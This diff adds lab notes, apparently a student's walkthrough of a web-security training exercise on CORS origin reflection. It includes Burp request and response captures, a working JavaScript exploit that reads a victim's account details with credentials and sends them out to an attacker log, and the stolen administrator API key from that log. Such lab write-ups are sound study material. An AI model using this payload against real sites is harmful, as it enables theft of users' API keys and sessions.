@@ -1,0 +1,60 @@
+Task 1:
+///Lab: CORS vulnerability with basic origin reflection///
+
+Open the site in burp. Log in with wiener/peter. Watch back the http history. There is a /accountDetails request where the site gives back sensitive data:
+HTTP/2 200 OK
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 189
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "PCuHzXqmLu2OXZyLIMSmiqELUjySVWye",
+  "sessions": [
+    "8nog1K3ldYz0BjL1mozxN9mRppzH0NcG",
+    "9KlxpXpOzorwkrsPX1ldn818pdmKYXxZ"
+  ]
+}
+Send the request to repeater, and add a line to the request:
+Origin: https://xyz.hu
+And send the request:
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://xyz.hu
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 189
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "PCuHzXqmLu2OXZyLIMSmiqELUjySVWye",
+  "sessions": [
+    "8nog1K3ldYz0BjL1mozxN9mRppzH0NcG",
+    "9KlxpXpOzorwkrsPX1ldn818pdmKYXxZ"
+  ]
+}
+This means its vulnerable to CORS. This means we can give any site which will be trustable to our browser, because the SOP is not configured well.
+So. Copy this into our exploit server:
+<script>
+    var xhr = new XMLHttpRequest();
+    var url = "https://0a0b00420301c5be806f039000b1009f.web-security-academy.net";
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+  
+            fetch("/log?key=" + xhr.responseText);
+        }
+    };
+
+    xhr.open('GET', url + "/accountDetails", true);
+    xhr.withCredentials = true; 
+    xhr.send();
+</script>
+Change your labID, store it, and deliver to the victim. Open the access log and you will find a line there like:
+10.0.3.197      2026-03-20 16:39:42 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22YyYDOfmNjwZ6EzGRnfbaGXrR4SRC697R%22,%20%20%22sessions%22:%20[%20%20%20%20%22nIsZ0poOlZXYvnl6Kxzl9YCyXhzGSZLS%22%20%20]} 
+And there is the administrators api key:YyYDOfmNjwZ6EzGRnfbaGXrR4SRC697R
+
+Task 2:
